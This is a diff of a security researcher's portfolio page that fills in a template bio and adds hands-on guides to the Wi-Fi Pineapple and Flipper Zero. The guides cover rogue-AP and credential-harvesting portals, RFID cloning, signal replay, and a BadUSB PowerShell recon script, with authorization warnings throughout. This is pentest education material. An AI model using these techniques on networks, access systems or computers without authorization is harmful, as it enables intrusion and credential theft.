@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>// yourname — Cybersecurity Researcher</title>
+    <title>// Zuhayr Shahid — Cybersecurity Researcher</title>
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&family=IBM+Plex+Mono:wght@300;400;500;600&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
@@ -690,6 +690,121 @@
             opacity: 0.3;
             margin: 3rem 0;
         }
+
+        /* ── EXPANDABLE NOTES ── */
+        .blog-entry { cursor: pointer; }
+        .blog-entry .expand-hint {
+            font-size: 0.7rem;
+            color: var(--text-dim);
+            margin-top: 0.5rem;
+            transition: color 0.2s;
+        }
+        .blog-entry:hover .expand-hint { color: var(--green-dim); }
+        .blog-entry.expanded .expand-hint .hint-text { display: none; }
+        .blog-entry.expanded .expand-hint::after { content: '[ ▲ collapse ]'; }
+
+        .note-body {
+            display: none;
+            margin-top: 1.25rem;
+            padding-top: 1.25rem;
+            border-top: 1px solid var(--border);
+        }
+        .blog-entry.expanded .note-body { display: block; }
+
+        .note-body h4 {
+            font-family: var(--font-display);
+            font-size: 0.95rem;
+            font-weight: 600;
+            color: var(--green-primary);
+            margin: 1.5rem 0 0.6rem 0;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+        }
+        .note-body h4:first-child { margin-top: 0; }
+        .note-body h4 .step-num {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: 24px;
+            height: 24px;
+            border-radius: 4px;
+            background: var(--green-ghost);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            font-size: 0.72rem;
+            font-family: var(--font-mono);
+            color: var(--green-primary);
+            flex-shrink: 0;
+        }
+        .note-body p {
+            font-size: 0.82rem;
+            color: var(--text-secondary);
+            line-height: 1.8;
+            margin-bottom: 0.75rem;
+        }
+        .note-body .cmd-block {
+            background: rgba(0, 0, 0, 0.4);
+            border: 1px solid var(--border);
+            border-left: 3px solid var(--green-dim);
+            border-radius: 6px;
+            padding: 1rem 1.25rem;
+            margin: 0.75rem 0;
+            overflow-x: auto;
+        }
+        .note-body .cmd-block code {
+            font-family: var(--font-mono);
+            font-size: 0.78rem;
+            line-height: 1.9;
+            color: var(--text-primary);
+        }
+        .note-body .cmd-block .cmd-comment {
+            color: var(--text-dim);
+            font-style: italic;
+        }
+        .note-body .cmd-block .cmd-prompt {
+            color: var(--green-primary);
+            user-select: none;
+        }
+        .note-body .cmd-block .cmd-flag {
+            color: var(--cyan);
+        }
+        .note-body .cmd-block .cmd-output {
+            color: var(--text-dim);
+        }
+        .note-body .cmd-block .cmd-string {
+            color: var(--amber);
+        }
+        .note-body .note-tip {
+            background: rgba(0, 212, 255, 0.06);
+            border: 1px solid rgba(0, 212, 255, 0.15);
+            border-radius: 6px;
+            padding: 0.85rem 1rem;
+            margin: 0.75rem 0;
+            font-size: 0.78rem;
+            color: var(--cyan);
+            line-height: 1.7;
+        }
+        .note-body .note-tip::before {
+            content: '💡 ';
+        }
+        .note-body .note-warning {
+            background: rgba(255, 184, 0, 0.06);
+            border: 1px solid rgba(255, 184, 0, 0.15);
+            border-radius: 6px;
+            padding: 0.85rem 1rem;
+            margin: 0.75rem 0;
+            font-size: 0.78rem;
+            color: var(--amber);
+            line-height: 1.7;
+        }
+        .note-body .note-warning::before {
+            content: '⚠ ';
+        }
+        .note-body .divider {
+            height: 1px;
+            background: var(--border);
+            margin: 1.5rem 0;
+        }
     </style>
 </head>
 <body>
@@ -697,7 +812,7 @@
 <header>
     <div class="header-inner">
         <a href="#about" class="logo" onclick="navigate('about')">
-            <span class="prompt">~/</span>yourname<span class="cursor"></span>
+            <span class="prompt">~/</span>Zuhayr Shahid<span class="cursor"></span>
         </a>
         <button class="hamburger" onclick="toggleMenu()" aria-label="Menu">[ = ]</button>
         <nav id="mainNav">
@@ -722,38 +837,31 @@
             <h1>Security researcher<br><span class="accent">&amp; builder.</span></h1>
 
             <p class="hero-bio">
-                I break things so they can be built back stronger. Focused on offensive security, 
-                threat hunting, and building tools that make the blue team's life easier. 
-                Currently exploring cloud security architecture and adversary emulation frameworks.
-                <!-- ✏️ EDIT: Replace with your own bio -->
+                Driven by a hacker's mindset, I am always thinking creatively, strategically, and offensively. I enjoy uncovering weaknesses, exploiting them, and assisting organizations in creating stronger, smaller, and more resilient security programs.
             </p>
 
             <div class="hero-tags">
                 <span class="tag highlight">Penetration Testing</span>
-                <span class="tag highlight">Threat Hunting</span>
-                <span class="tag">Cloud Security</span>
-                <span class="tag">Malware Analysis</span>
+                <span class="tag highlight">Wireless Security</span>
+                <span class="tag highlight">Ethical Hacking</span>
+                <span class="tag">Kali Linux</span>
+                <span class="tag">Network Exploitation</span>
+                <span class="tag">Physical Security</span>
+                <span class="tag">Hardware Hacking</span>
                 <span class="tag">OSINT</span>
-                <span class="tag">Incident Response</span>
-                <span class="tag">Red Team Ops</span>
-                <span class="tag">Network Forensics</span>
-                <!-- ✏️ EDIT: Replace with your specializations -->
+                <span class="tag">Vulnerability Assessment</span>
             </div>
 
             <div class="hero-links">
-                <a href="https://github.com/yourusername" target="_blank">
+                <a href="https://github.com/ZMsec-exe" target="_blank">
                     <span class="icon">⟁</span> GitHub
                 </a>
-                <a href="https://linkedin.com/in/yourusername" target="_blank">
+                <a href="https://www.linkedin.com/in/zuhayrshahid/" target="_blank">
                     <span class="icon">◈</span> LinkedIn
                 </a>
-                <a href="https://twitter.com/yourusername" target="_blank">
-                    <span class="icon">◇</span> Twitter / X
-                </a>
-                <a href="mailto:you@example.com">
+                <a href="mailto:ZMSec@protonmail.com">
                     <span class="icon">▷</span> Contact
                 </a>
-                <!-- ✏️ EDIT: Replace with your actual links -->
             </div>
         </div>
 
@@ -767,44 +875,40 @@
             <div class="terminal-body">
                 <div class="line"><span class="prompt-char">$</span> <span class="cmd">cat</span> <span class="flag">--about</span> <span class="string">~/profile.yml</span></div>
                 <div class="line">&nbsp;</div>
-                <div class="line"><span class="key">name:</span> <span class="val">"Your Name"</span></div>
-                <div class="line"><span class="key">role:</span> <span class="val">"Cybersecurity Researcher"</span></div>
+                <div class="line"><span class="key">name:</span> <span class="val">"Zuhayr Shahid"</span></div>
+                <div class="line"><span class="key">roles:</span> <span class="val">"Security Engineer | Penetration Tester | Cybersecurity Researcher"</span></div>
                 <div class="line"><span class="key">location:</span> <span class="val">"United States"</span></div>
-                <div class="line"><span class="key">focus:</span> <span class="val">["offensive security", "threat intelligence", "tooling"]</span></div>
-                <div class="line"><span class="key">currently:</span> <span class="val">"Building adversary emulation frameworks"</span></div>
+                <div class="line"><span class="key">focus:</span> <span class="val">["offensive security", "wireless exploitation", "ethical hacking", "network pentesting"]</span></div>
+                <div class="line"><span class="key">certs:</span> <span class="val">["OSWP", "KLCP", "Cisco Ethical Hacking"]</span></div>
                 <div class="line"><span class="key">open_to:</span> <span class="val">["consulting", "research collaboration", "CTF teams"]</span></div>
                 <div class="line">&nbsp;</div>
-                <div class="line"><span class="comment"># ✏️ EDIT: Customize the fields above with your info</span></div>
             </div>
         </div>
 
         <div class="about-grid">
             <div class="about-card">
                 <h3><span class="sym">⟐</span> What I Do</h3>
-                <p>I specialize in penetration testing, vulnerability research, and building security automation tools. My work spans from red team engagements to developing detection engineering pipelines.</p>
-                <!-- ✏️ EDIT: Describe your work -->
+                <p>I specialize in penetration testing, wireless security assessments, and offensive security research. From network exploitation and vulnerability discovery to helping organizations harden their attack surface — I approach every engagement with a hacker's mindset and a builder's discipline.</p>
             </div>
             <div class="about-card">
                 <h3><span class="sym">⟁</span> Tech Stack</h3>
                 <ul>
-                    <li>Python, Go, Bash, PowerShell</li>
-                    <li>Burp Suite, Metasploit, Cobalt Strike</li>
-                    <li>AWS / Azure / GCP Security</li>
-                    <li>Splunk, ELK, Sentinel</li>
-                    <li>Docker, Kubernetes, Terraform</li>
+                    <li>Kali Linux, Parrot OS, Bash, Python</li>
+                    <li>Nmap, Burp Suite, Metasploit, Aircrack-ng</li>
+                    <li>Wireshark, Hashcat, John the Ripper</li>
+                    <li>OSINT Frameworks &amp; Recon Tools</li>
+                    <li>Git, Docker, Linux Administration</li>
                 </ul>
-                <!-- ✏️ EDIT: List your tools & tech -->
             </div>
             <div class="about-card">
                 <h3><span class="sym">◈</span> Interests</h3>
                 <ul>
-                    <li>Adversary simulation & purple teaming</li>
-                    <li>Threat intelligence automation</li>
+                    <li>Wireless exploitation &amp; RF security</li>
+                    <li>Network penetration testing</li>
+                    <li>CTF competitions &amp; wargames</li>
                     <li>Open source security tooling</li>
-                    <li>CTF competitions</li>
-                    <li>Security community mentorship</li>
+                    <li>Security community &amp; mentorship</li>
                 </ul>
-                <!-- ✏️ EDIT: List your interests -->
             </div>
         </div>
     </section>
@@ -814,73 +918,253 @@
         <div class="section-header">
             <div class="path">~/projects $</div>
             <h2>Projects & Tools</h2>
-            <p>Open-source tools, research projects, and things I've built.</p>
+            <p>Hardware tools I work with, configuration guides, and practical use cases for security assessments.</p>
         </div>
 
-        <div class="projects-grid">
-            <div class="project-card">
-                <div class="status-badge active"><span class="sdot"></span> Active</div>
-                <h3>ReconPilot</h3>
-                <p class="desc">Automated reconnaissance framework that chains together subdomain enumeration, port scanning, and service fingerprinting into a unified pipeline with configurable output formats.</p>
-                <div class="tech-stack">
-                    <span class="tech-tag">Python</span>
-                    <span class="tech-tag">AsyncIO</span>
-                    <span class="tech-tag">Docker</span>
+        <div class="blog-list">
+
+            <!-- ══════ PROJECT 1: WIFI PINEAPPLE ══════ -->
+            <div class="blog-entry" onclick="this.classList.toggle('expanded')">
+                <div class="blog-date">
+                    <div class="month" style="font-size:1.5rem;">🍍</div>
                 </div>
-                <div class="project-links">
-                    <a href="#">[ GitHub ]</a>
-                    <a href="#">[ Docs ]</a>
+                <div class="blog-content">
+                    <div style="display:flex; gap:0.5rem; margin-bottom:0.75rem; flex-wrap:wrap;">
+                        <span class="tag highlight" style="font-size:0.68rem;">Hardware</span>
+                        <span class="tag" style="font-size:0.68rem; border-color:var(--green-dim); color:var(--green-primary);">Active Tool</span>
+                    </div>
+                    <h3>Hak5 Wi-Fi Pineapple Mark VII</h3>
+                    <p class="excerpt">The Wi-Fi Pineapple is a wireless auditing platform designed for penetration testers to conduct rogue AP attacks, capture WPA handshakes, perform man-in-the-middle attacks, and assess wireless network security — all from a purpose-built, field-deployable device running the PineAP suite.</p>
+                    <div class="blog-tags">
+                        <span class="blog-tag">wireless-auditing</span>
+                        <span class="blog-tag">rogue-AP</span>
+                        <span class="blog-tag">MITM</span>
+                        <span class="blog-tag">Hak5</span>
+                        <span class="blog-tag">PineAP</span>
+                    </div>
+                    <div class="expand-hint"><span class="hint-text">[ ▼ click for setup guide &amp; use cases ]</span></div>
+
+                    <div class="note-body">
+
+                        <div class="note-warning">The Wi-Fi Pineapple is intended for authorized wireless security audits only. Deploying rogue access points or intercepting traffic on networks without explicit written permission is illegal. Always operate within the scope of your engagement.</div>
+
+                        <h4><span class="step-num">1</span> Hardware Overview</h4>
+                        <p>The Mark VII is built on a modified OpenWRT platform with dual radios — one dedicated to management and one for attacks. It operates on 2.4 GHz and supports monitor mode, packet injection, and client deauthentication natively. The Enterprise variant adds 5 GHz support and an RJ45 WAN port for larger engagements.</p>
+                        <p>Key components: dual RP-SMA antenna connectors, USB-C port (power + Ethernet adapter), USB-A port for storage/expansion, and a status LED for quick state identification.</p>
+
+                        <h4><span class="step-num">2</span> Initial Setup &amp; Configuration</h4>
+                        <p>The Pineapple ships with a minimal "stager" firmware that downloads the latest full firmware during first boot. Here's the setup process:</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Step 1: Attach antennas to RP-SMA ports (don't overtighten)</span><br>
+<span class="cmd-comment"># Step 2: Connect via USB-C to your laptop</span><br>
+<span class="cmd-comment"># Step 3: The Pineapple appears as a USB Ethernet adapter</span><br>
+<span class="cmd-comment">#         Your machine will get a DHCP address in 172.16.42.0/24</span><br><br>
+<span class="cmd-comment"># Verify connectivity</span><br>
+<span class="cmd-prompt">$ </span>ping 172.16.42.1<br><br>
+<span class="cmd-comment"># Open the web interface in your browser</span><br>
+<span class="cmd-prompt">$ </span>firefox http://172.16.42.1:1471<br><br>
+<span class="cmd-comment"># The setup wizard will prompt you to:</span><br>
+<span class="cmd-output">1. Verify physical access (press reset button)</span><br>
+<span class="cmd-output">2. Connect to a Wi-Fi network for firmware download</span><br>
+<span class="cmd-output">3. Wait 10-15 min for firmware flash</span><br>
+<span class="cmd-output">4. Set root password &amp; management SSID</span>
+                        </code></div>
+
+                        <div class="note-tip">The USB-C connection is the most stable setup method. If using Wi-Fi instead, connect to the open network named "Pineapple_XXXX" (last 4 of MAC). Mac users may need to install ASIX AX88772C drivers manually.</div>
+
+                        <h4><span class="step-num">3</span> SSH Access &amp; CLI Management</h4>
+                        <p>For deeper configuration and scripting, SSH into the Pineapple directly:</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># SSH into the Pineapple</span><br>
+<span class="cmd-prompt">$ </span>ssh root@172.16.42.1<br><br>
+<span class="cmd-comment"># Check running firmware version</span><br>
+<span class="cmd-prompt">root@pineapple:~# </span>cat /etc/os-release<br><br>
+<span class="cmd-comment"># View wireless interfaces</span><br>
+<span class="cmd-prompt">root@pineapple:~# </span>iwconfig<br>
+<span class="cmd-output">wlan0  IEEE 802.11  Mode:Master  (management radio)</span><br>
+<span class="cmd-output">wlan1  IEEE 802.11  Mode:Monitor (attack radio)</span><br><br>
+<span class="cmd-comment"># Check connected clients</span><br>
+<span class="cmd-prompt">root@pineapple:~# </span>iw dev wlan1 station dump
+                        </code></div>
+
+                        <h4><span class="step-num">4</span> Core Attack Capabilities</h4>
+                        <p>The PineAP suite provides a streamlined workflow for wireless auditing. Here are the primary attack modes:</p>
+
+                        <p><strong style="color:var(--green-primary);">Recon &amp; Scanning</strong> — Passively discover nearby access points, clients, and their probe requests. Map the wireless environment to identify targets and understand network relationships before any active attacks.</p>
+
+                        <p><strong style="color:var(--green-primary);">Rogue AP / Evil Twin</strong> — The Pineapple can impersonate trusted networks by responding to client probe requests. When a device probes for "CoffeeShop_WiFi", the Pineapple answers and the client connects automatically — routing all traffic through your device.</p>
+
+                        <p><strong style="color:var(--green-primary);">Deauthentication</strong> — Targeted deauth attacks force clients off their legitimate AP, pushing them toward your rogue AP. The Pineapple's filtering (MAC/SSID allow/deny lists) keeps the attack scoped to authorized targets only.</p>
+
+                        <p><strong style="color:var(--green-primary);">Handshake Capture</strong> — Capture WPA/WPA2 4-way handshakes for offline cracking. Captured PCAP files can be exported and cracked with Aircrack-ng or Hashcat on your workstation.</p>
+
+                        <p><strong style="color:var(--green-primary);">Man-in-the-Middle</strong> — Once clients connect to the rogue AP, you can intercept and analyze traffic — DNS spoofing, credential harvesting via Evil Portal, SSL stripping, and packet capture are all supported through built-in modules.</p>
+
+                        <h4><span class="step-num">5</span> Key Modules</h4>
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Modules available through the web interface (Settings > Modules)</span><br><br>
+<span class="cmd-string">Evil Portal</span>    <span class="cmd-comment"># Create fake captive portals to harvest credentials</span><br>
+<span class="cmd-string">DWall</span>          <span class="cmd-comment"># Real-time HTTP traffic monitoring dashboard</span><br>
+<span class="cmd-string">DNSspoof</span>       <span class="cmd-comment"># Redirect DNS queries to attacker-controlled hosts</span><br>
+<span class="cmd-string">tcpdump</span>        <span class="cmd-comment"># Full packet capture for later analysis</span><br>
+<span class="cmd-string">Nmap</span>           <span class="cmd-comment"># Network scanning from the Pineapple itself</span><br>
+<span class="cmd-string">Cabinet</span>        <span class="cmd-comment"># File browser for managing captured data</span><br>
+<span class="cmd-string">Papers</span>         <span class="cmd-comment"># Note-taking for engagement documentation</span>
+                        </code></div>
+
+                        <h4><span class="step-num">6</span> Engagement Tips</h4>
+                        <div class="note-tip">Always configure MAC and SSID filters before activating PineAP. This scopes your attack to only the authorized target network and prevents collateral impact on nearby networks — critical for professional engagements.</div>
+                        <div class="note-tip">Power the Pineapple from a USB battery bank for field deployments. Use a USB-A power bank (not USB-C PD) to avoid power negotiation issues. Some USB-C PD chargers won't deliver the basic 5V the Pineapple needs.</div>
+                        <div class="note-tip">For covert assessments, the Pineapple's small form factor lets you deploy it in a backpack or drop it in a ceiling tile. Pair with Hak5 Cloud C2 for remote management over the internet.</div>
+
+                    </div>
                 </div>
-                <!-- ✏️ EDIT: Replace with your project -->
             </div>
 
-            <div class="project-card">
-                <div class="status-badge active"><span class="sdot"></span> Active</div>
-                <h3>ThreatMap</h3>
-                <p class="desc">Real-time threat intelligence aggregator that pulls from multiple OSINT feeds, correlates IOCs, and generates actionable reports with MITRE ATT&CK mapping.</p>
-                <div class="tech-stack">
-                    <span class="tech-tag">Go</span>
-                    <span class="tech-tag">React</span>
-                    <span class="tech-tag">PostgreSQL</span>
-                    <span class="tech-tag">MITRE ATT&CK</span>
+            <!-- ══════ PROJECT 2: FLIPPER ZERO ══════ -->
+            <div class="blog-entry" onclick="this.classList.toggle('expanded')">
+                <div class="blog-date">
+                    <div class="month" style="font-size:1.5rem;">🐬</div>
                 </div>
-                <div class="project-links">
-                    <a href="#">[ GitHub ]</a>
-                    <a href="#">[ Demo ]</a>
+                <div class="blog-content">
+                    <div style="display:flex; gap:0.5rem; margin-bottom:0.75rem; flex-wrap:wrap;">
+                        <span class="tag highlight" style="font-size:0.68rem;">Hardware</span>
+                        <span class="tag" style="font-size:0.68rem; border-color:var(--green-dim); color:var(--green-primary);">Active Tool</span>
+                    </div>
+                    <h3>Flipper Zero — Multi-Tool for Physical Pentesting</h3>
+                    <p class="excerpt">A pocket-sized multi-tool for interacting with access control systems, RFID/NFC, sub-GHz radio protocols, infrared devices, and USB HID attacks. Think of it as a Swiss Army knife for physical security assessments — one device that replaces a bag full of specialized hardware.</p>
+                    <div class="blog-tags">
+                        <span class="blog-tag">RFID</span>
+                        <span class="blog-tag">NFC</span>
+                        <span class="blog-tag">sub-GHz</span>
+                        <span class="blog-tag">infrared</span>
+                        <span class="blog-tag">BadUSB</span>
+                        <span class="blog-tag">physical-pentest</span>
+                    </div>
+                    <div class="expand-hint"><span class="hint-text">[ ▼ click for capabilities &amp; use cases ]</span></div>
+
+                    <div class="note-body">
+
+                        <div class="note-warning">The Flipper Zero is a security research and education tool. Using it to access systems, clone credentials, or replay signals without explicit authorization is illegal. Only use in authorized engagements, personal lab environments, or on devices you own.</div>
+
+                        <h4><span class="step-num">1</span> What's Inside the Flipper</h4>
+                        <p>Despite its toy-like appearance, the Flipper Zero packs serious hardware. Here's what you're working with:</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Flipper Zero Hardware Capabilities</span><br><br>
+<span class="cmd-string">Sub-GHz Radio</span>    <span class="cmd-comment"># TX/RX on 300-928 MHz (433, 315, 868, 915 MHz bands)</span><br>
+<span class="cmd-string">125 kHz RFID</span>     <span class="cmd-comment"># Read, write, &amp; emulate low-frequency proximity cards</span><br>
+<span class="cmd-string">NFC (13.56 MHz)</span>  <span class="cmd-comment"># Read, write, &amp; emulate NFC tags (MIFARE, NTAG, etc.)</span><br>
+<span class="cmd-string">Infrared</span>         <span class="cmd-comment"># Transmit &amp; receive IR signals (TV, AC, projectors)</span><br>
+<span class="cmd-string">USB-C (HID)</span>      <span class="cmd-comment"># Emulate keyboard/mouse — BadUSB / Rubber Ducky scripts</span><br>
+<span class="cmd-string">GPIO Pins</span>        <span class="cmd-comment"># Hardware hacking, UART, SPI, I2C debugging</span><br>
+<span class="cmd-string">Bluetooth LE</span>     <span class="cmd-comment"># BLE communication (expandable w/ modules)</span><br>
+<span class="cmd-string">iButton</span>          <span class="cmd-comment"># Read &amp; emulate 1-Wire iButton keys</span><br>
+<span class="cmd-string">microSD Slot</span>     <span class="cmd-comment"># Expandable storage up to 32GB for captures &amp; scripts</span>
+                        </code></div>
+
+                        <h4><span class="step-num">2</span> Getting Started &amp; Firmware</h4>
+                        <p>Out of the box, the Flipper runs official firmware from Flipper Devices. The first step is connecting it to the qFlipper desktop app or the Flipper mobile app to update firmware and manage files.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># Download qFlipper from flipperzero.one/update</span><br>
+<span class="cmd-comment"># Connect Flipper via USB-C</span><br>
+<span class="cmd-comment"># qFlipper auto-detects and updates firmware</span><br><br>
+<span class="cmd-comment"># Firmware options:</span><br>
+<span class="cmd-string">Official</span>       <span class="cmd-comment"># Stable, legal frequency limits, regular updates</span><br>
+<span class="cmd-string">Unleashed</span>      <span class="cmd-comment"># Removes regional RF restrictions, extra protocols</span><br>
+<span class="cmd-string">Momentum</span>       <span class="cmd-comment"># UI customization, BLE spam tools, advanced features</span><br>
+<span class="cmd-string">RogueMaster</span>    <span class="cmd-comment"># Merges community features, extra apps &amp; games</span><br><br>
+<span class="cmd-comment"># Insert a microSD card (FAT32) for expanded storage</span><br>
+<span class="cmd-comment"># The Flipper stores all saved signals, keys, and scripts on the SD card</span>
+                        </code></div>
+
+                        <div class="note-tip">For authorized pentesting, community firmware like Unleashed opens up extended sub-GHz frequency ranges and rolling code support that the official firmware restricts for legal compliance. Understand your local RF regulations before switching.</div>
+
+                        <h4><span class="step-num">3</span> Use Case — RFID Access Card Cloning (125 kHz)</h4>
+                        <p>One of the most impactful physical pentest capabilities. Many office buildings, hotels, and secure facilities still use low-frequency proximity cards that the Flipper can read and emulate in seconds.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># On the Flipper:</span><br>
+<span class="cmd-output">Main Menu > 125 kHz RFID > Read</span><br><br>
+<span class="cmd-comment"># Hold the Flipper within ~1 inch of the target card/fob</span><br>
+<span class="cmd-comment"># The Flipper reads and identifies the card type:</span><br>
+<span class="cmd-output">Card type: EM4100</span><br>
+<span class="cmd-output">ID: 01:AB:CD:EF:23</span><br><br>
+<span class="cmd-comment"># Save the card data with a descriptive name</span><br>
+<span class="cmd-output">Save > "lobby_badge_test"</span><br><br>
+<span class="cmd-comment"># To emulate (replay) the saved card:</span><br>
+<span class="cmd-output">125 kHz RFID > Saved > lobby_badge_test > Emulate</span><br><br>
+<span class="cmd-comment"># Hold the Flipper to the RFID reader — it transmits the cloned signal</span>
+                        </code></div>
+
+                        <div class="note-warning">Modern access control systems using rolling codes, MIFARE DESFire, or HID iCLASS SE with diversified keys are resistant to simple replay attacks. Always document which card technologies are vulnerable and recommend upgrades in your report.</div>
+
+                        <h4><span class="step-num">4</span> Use Case — Sub-GHz Signal Capture &amp; Replay</h4>
+                        <p>The Flipper can capture and replay radio signals used by garage doors, gate openers, wireless sensors, IoT devices, and some older key fobs operating on 300-928 MHz bands.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># On the Flipper:</span><br>
+<span class="cmd-output">Main Menu > Sub-GHz > Read</span><br><br>
+<span class="cmd-comment"># Press the target device's button (e.g., garage remote)</span><br>
+<span class="cmd-comment"># The Flipper captures the signal:</span><br>
+<span class="cmd-output">Protocol: Princeton</span><br>
+<span class="cmd-output">Frequency: 433.92 MHz</span><br>
+<span class="cmd-output">Key: 0x00ABC123</span><br><br>
+<span class="cmd-comment"># Save and replay:</span><br>
+<span class="cmd-output">Save > "gate_test_signal"</span><br>
+<span class="cmd-output">Sub-GHz > Saved > gate_test_signal > Send</span><br><br>
+<span class="cmd-comment"># For frequency analysis (find unknown signals):</span><br>
+<span class="cmd-output">Sub-GHz > Frequency Analyzer</span><br>
+<span class="cmd-comment"># Shows real-time RF activity and identifies active frequencies</span>
+                        </code></div>
+
+                        <div class="note-tip">Static code systems (fixed key) are trivially replayable. Rolling code systems (like modern garage doors and car fobs) change the key with every transmission — the Flipper cannot crack these out of the box. This is a common myth. Document the difference in your findings.</div>
+
+                        <h4><span class="step-num">5</span> Use Case — BadUSB / Rubber Ducky Attacks</h4>
+                        <p>The Flipper can emulate a USB keyboard when plugged into a target computer via USB-C. This lets you run pre-written Rubber Ducky scripts that execute commands at typing speed — useful for demonstrating physical access risks.</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-comment"># BadUSB scripts are stored on the Flipper's SD card</span><br>
+<span class="cmd-comment"># Location: /badusb/ on the microSD</span><br><br>
+<span class="cmd-comment"># Example script: Open PowerShell and grab system info</span><br>
+<span class="cmd-string">DELAY 1000</span><br>
+<span class="cmd-string">GUI r</span>                   <span class="cmd-comment"># Win+R to open Run dialog</span><br>
+<span class="cmd-string">DELAY 500</span><br>
+<span class="cmd-string">STRING powershell</span>       <span class="cmd-comment"># Type "powershell"</span><br>
+<span class="cmd-string">ENTER</span><br>
+<span class="cmd-string">DELAY 1000</span><br>
+<span class="cmd-string">STRING whoami; systeminfo; ipconfig /all</span><br>
+<span class="cmd-string">ENTER</span><br><br>
+<span class="cmd-comment"># To deploy: plug Flipper into target machine</span><br>
+<span class="cmd-output">Main Menu > Bad USB > select script > Run</span>
+                        </code></div>
+
+                        <div class="note-tip">BadUSB attacks demonstrate why physical access control matters. If an attacker can plug a device into an unlocked workstation for 10 seconds, they can exfiltrate data, create backdoor accounts, or install persistence mechanisms. Recommend USB port lockdown policies and endpoint detection in your report.</div>
+
+                        <h4><span class="step-num">6</span> Use Case — Infrared &amp; NFC</h4>
+                        <p><strong style="color:var(--green-primary);">Infrared:</strong> The Flipper has a built-in IR transmitter and receiver. It comes with a universal remote database covering thousands of TVs, projectors, AC units, and AV equipment. You can also capture and replay unknown IR signals. In pentesting, this is useful for demonstrating control over conference room projectors, digital signage, or smart office equipment during physical assessments.</p>
+
+                        <p><strong style="color:var(--green-primary);">NFC (13.56 MHz):</strong> The Flipper can read, save, and emulate NFC tags including MIFARE Classic, MIFARE Ultralight, and NTAG series. For access control systems using NFC badges, the workflow is similar to RFID — read the badge, save it, and emulate. Note that modern high-security NFC cards (DESFire EV2/EV3, SEOS) use encrypted authentication that the Flipper cannot bypass.</p>
+
+                        <h4><span class="step-num">7</span> Expanding the Flipper</h4>
+                        <p>The GPIO header on top of the Flipper supports add-on modules that extend its capabilities significantly:</p>
+
+                        <div class="cmd-block"><code>
+<span class="cmd-string">Wi-Fi Dev Board</span>    <span class="cmd-comment"># Adds Wi-Fi scanning, packet capture (ESP32-based)</span><br>
+<span class="cmd-string">Video Game Module</span>  <span class="cmd-comment"># Video output + extra processing power</span><br>
+<span class="cmd-string">Prototyping Board</span>  <span class="cmd-comment"># Custom hardware hacking &amp; circuit debugging</span><br>
+<span class="cmd-string">Third-party boards</span> <span class="cmd-comment"># Community-built: GPS, SDR, LoRa, extra antennas</span>
+                        </code></div>
+
+                        <div class="note-tip">The Flipper is open-source and community-driven. Check the official Flipper Zero GitHub and community forums for new apps, plugins, and firmware features. The ecosystem is constantly growing — frequency analyzers, protocol fuzzers, and BLE tools are all actively developed.</div>
+
+                    </div>
                 </div>
-                <!-- ✏️ EDIT: Replace with your project -->
             </div>
 
-            <div class="project-card">
-                <div class="status-badge wip"><span class="sdot"></span> In Progress</div>
-                <h3>CloudHunter</h3>
-                <p class="desc">Cloud security posture scanner for AWS/Azure/GCP that identifies misconfigurations, excessive permissions, and compliance gaps with remediation playbooks.</p>
-                <div class="tech-stack">
-                    <span class="tech-tag">Python</span>
-                    <span class="tech-tag">Terraform</span>
-                    <span class="tech-tag">AWS SDK</span>
-                </div>
-                <div class="project-links">
-                    <a href="#">[ GitHub ]</a>
-                </div>
-                <!-- ✏️ EDIT: Replace with your project -->
-            </div>
-
-            <div class="project-card">
-                <div class="status-badge archived"><span class="sdot"></span> Archived</div>
-                <h3>PhishKit Analyzer</h3>
-                <p class="desc">Automated phishing kit dissection tool that extracts C2 infrastructure, credential exfiltration endpoints, and evasion techniques from collected kits.</p>
-                <div class="tech-stack">
-                    <span class="tech-tag">Python</span>
-                    <span class="tech-tag">YARA</span>
-                    <span class="tech-tag">Elasticsearch</span>
-                </div>
-                <div class="project-links">
-                    <a href="#">[ GitHub ]</a>
-                    <a href="#">[ Blog Post ]</a>
-                </div>
-                <!-- ✏️ EDIT: Replace with your project -->
-            </div>
         </div>
     </section>
 
@@ -896,45 +1180,41 @@
             <div class="cert-item">
                 <div class="cert-icon">⛨</div>
                 <div class="cert-info">
-                    <h3>OSCP — Offensive Security Certified Professional</h3>
+                    <h3>OSWP — OffSec Wireless Professional</h3>
                     <div class="issuer">Offensive Security (OffSec)</div>
-                    <div class="cert-date">Obtained: 2024 &nbsp;·&nbsp; Active</div>
-                    <p class="cert-desc">Hands-on penetration testing certification covering network exploitation, web app attacks, privilege escalation, and Active Directory compromise.</p>
+                    <div class="cert-date">Active &nbsp;·&nbsp; <a href="https://credentials.offsec.com/bd77e1d4-a27f-44d0-b14a-c3ed099b813a#acc.dx1bj0nW" target="_blank" style="color:var(--cyan); text-decoration:none; font-size:0.72rem;">[ Verify Credential ↗ ]</a></div>
+                    <p class="cert-desc">Hands-on wireless security certification covering IEEE 802.11 network attacks, WPA/WPA2 cracking, rogue access point deployment, and wireless traffic analysis using Kali Linux tools.</p>
                 </div>
-                <!-- ✏️ EDIT: Replace with your cert -->
             </div>
 
             <div class="cert-item">
                 <div class="cert-icon">◉</div>
                 <div class="cert-info">
-                    <h3>CompTIA Security+</h3>
-                    <div class="issuer">CompTIA</div>
-                    <div class="cert-date">Obtained: 2023 &nbsp;·&nbsp; Active</div>
-                    <p class="cert-desc">Foundational security certification covering threat analysis, risk management, cryptography, and identity/access management.</p>
+                    <h3>KLCP — Kali Linux Certified Professional</h3>
+                    <div class="issuer">Offensive Security (OffSec)</div>
